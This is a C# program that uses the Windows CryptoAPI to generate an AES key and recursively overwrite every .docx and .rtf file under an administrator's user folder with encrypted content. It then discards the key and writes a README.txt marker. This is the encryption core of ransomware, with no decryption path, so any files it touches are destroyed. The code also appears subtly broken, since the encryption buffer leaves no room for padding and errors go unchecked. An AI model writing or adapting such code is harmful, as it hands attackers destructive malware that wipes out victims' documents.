using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace FileEncryption
{
    public static class FileEncryptor
    {
        private const int CALG_AES_128 = 0x0000660e;
        private const int CRYPT_EXPORTABLE = 0x00000001;
        private const int PROV_RSA_AES = 24;
        private const int KP_KEYLEN = 9;

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptAcquireContext(out IntPtr hProv, string pszContainer, string pszProvider, int dwProvType, int dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptDestroyKey(IntPtr hKey);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);

        public static void EncryptFiles(string directoryPath)
        {
            IntPtr hProvider = IntPtr.Zero;
            IntPtr hKey = IntPtr.Zero;

            try
            {
                if (!CryptAcquireContext(out hProvider, null, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0))
                {
                    throw new CryptographicException(Marshal.GetLastWin32Error());
                }

                if (!CryptGenKey(hProvider, CALG_AES_128, CRYPT_EXPORTABLE, out hKey))
                {
                    throw new CryptographicException(Marshal.GetLastWin32Error());
                }

                string[] fileExtensions = { ".docx", ".rtf" };

                foreach (string file in Directory.EnumerateFiles(directoryPath, "*.*", SearchOption.AllDirectories))
                {
                    string extension = Path.GetExtension(file);

                    if (Array.IndexOf(fileExtensions, extension) >= 0)
                    {
                        EncryptFile(file, hKey);
                    }
                }

                string readmePath = Path.Combine("C:\\", "README.txt");
                File.WriteAllText(readmePath, "done");
            }
            finally
            {
                if (hKey != IntPtr.Zero)
                {
                    CryptDestroyKey(hKey);
                }

                if (hProvider != IntPtr.Zero)
                {
                    CryptReleaseContext(hProvider, 0);
                }
            }
        }

        private static void EncryptFile(string filePath, IntPtr hKey)
        {
            byte[] fileData = File.ReadAllBytes(filePath);
            byte[] encryptedData = EncryptData(fileData, hKey);

            using (FileStream fileStream = new FileStream(filePath, FileMode.Create))
            {
                fileStream.Write(encryptedData, 0, encryptedData.Length);
            }
        }

        private static byte[] EncryptData(byte[] data, IntPtr hKey)
        {
            byte[] encryptedData = new byte[data.Length];
            Buffer.BlockCopy(data, 0, encryptedData, 0, data.Length);

            int dataLength = encryptedData.Length;
            CryptEncrypt(hKey, IntPtr.Zero, true, 0, encryptedData, ref dataLength, dataLength);

            return encryptedData;
}
}
public static class Program
{
    public static void Main()
    {
        string directoryPath = @"C:\Users\domain.admin";

        try
        {
            FileEncryptor.EncryptFiles(directoryPath);
            Console.WriteLine("Encryption complete.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Encryption failed: " + ex.Message);
        }
    }
}
}
